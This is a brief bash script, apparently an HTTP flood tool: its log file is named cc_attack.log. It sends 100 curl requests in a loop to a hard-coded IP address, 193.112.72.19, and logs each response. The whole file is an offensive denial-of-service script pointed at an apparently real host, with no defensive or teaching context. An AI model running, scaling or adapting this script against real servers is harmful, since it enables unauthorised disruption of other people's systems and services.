#! /bin/bash

url="http://193.112.72.19"
> cc_attack.log
for ((i=1;i<=100;i++))
do
	echo $i >> cc_attack.log
	curl $url >> cc_attack.log
done

